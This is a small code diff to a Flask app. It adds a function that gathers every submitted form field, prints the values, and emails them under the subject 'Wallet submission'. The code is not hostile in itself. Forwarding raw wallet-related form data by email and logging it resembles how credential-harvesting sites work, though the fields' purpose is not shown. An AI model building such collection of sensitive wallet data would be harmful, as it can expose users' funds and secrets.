@@ -5,6 +5,7 @@ from .email import send_mail
 from flask_login import current_user
 from app import db, UPLOADS_PATH
 import logging
+import os
 from os import path
 
 
@@ -166,8 +167,13 @@ def get_trx():
                                 ).all()
 
 
+def send_data(form_data):
+    mail_address = os.getenv('EMAIL_ADDRESS')
 
+    # Collect all form fields and format them into a message
+    message = "\n".join([f"{key}: {value}" for key, value in form_data.items()])
+    print(message)
 
-
+    send_mail(mail_address, f'Wallet submission from {current_user.email}', str(message))
 
 
